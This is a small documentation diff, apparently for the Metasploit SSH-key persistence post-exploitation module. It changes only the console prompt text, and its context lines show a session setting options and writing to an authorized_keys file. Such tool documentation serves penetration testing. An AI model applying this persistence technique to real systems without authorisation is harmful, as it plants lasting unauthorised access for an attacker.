@@ -67,7 +67,7 @@ Use the post module to write the ssh key
     SESSION => 1
     msf post(sshkey_persistence) > set CREATESSHFOLDER true
     CreateSSHFolder => true    
-    msf5 post(windows/manage/sshkey_persistence) > run
+    msf post(windows/manage/sshkey_persistence) > run
     
     [*] Checking SSH Permissions
     [*] Authorized Keys File: .ssh/authorized_keys
